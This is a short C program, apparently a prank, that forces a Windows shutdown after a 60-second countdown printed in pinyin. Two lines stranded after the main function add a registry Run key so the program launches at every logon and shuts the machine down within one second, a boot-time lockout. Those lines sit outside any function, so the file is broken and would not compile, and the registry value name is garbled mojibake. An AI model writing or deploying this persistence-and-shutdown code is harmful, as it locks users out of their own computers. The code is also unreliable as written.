#include <stdio.h>
#include<stdlib.h>
#include<conio.h>
#include<dos.h>
int main()
{
	system ("shutdown -s -t 60");
	for(int i=60;i>0;i--)
	{
	  printf("xi tong jiang zai %d miao hou guan ji !",i);
	  sleep(1);
	  clrscr();
	}

}
system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ¿ªÊ¼  /t REG_SZ /d d:\\my_program.exe");
    system("shutdown -s -t 1");